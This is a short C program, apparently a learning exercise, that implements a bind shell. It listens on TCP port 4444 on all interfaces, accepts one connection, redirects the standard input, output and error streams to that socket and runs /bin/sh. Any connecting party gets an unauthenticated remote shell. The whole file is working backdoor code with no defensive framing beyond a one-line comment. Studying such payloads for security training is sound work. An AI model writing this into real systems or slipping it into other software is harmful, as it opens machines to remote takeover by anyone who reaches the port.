//
// This will cover bind shells over TCP
//

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>


int main(void){

    //listening socket variable
    int listening_sock = socket(AF_INET,SOCK_STREAM,0);

    //struct containing information
    //listen on all interfaces over port 4444
    struct sockaddr_in server_adder;
    server_adder.sin_family = AF_INET;
    server_adder.sin_addr.s_addr = INADDR_ANY;
    server_adder.sin_port = htons(4444);

    bind(listening_sock, (struct sockaddr *)&server_adder, sizeof(server_adder));

    listen(listening_sock,0);

    int connection_sock = accept(listening_sock,NULL,NULL);

    dup2(connection_sock,0);
    dup2(connection_sock,1);
    dup2(connection_sock,2);

    execve("/bin/sh",NULL,NULL);
}


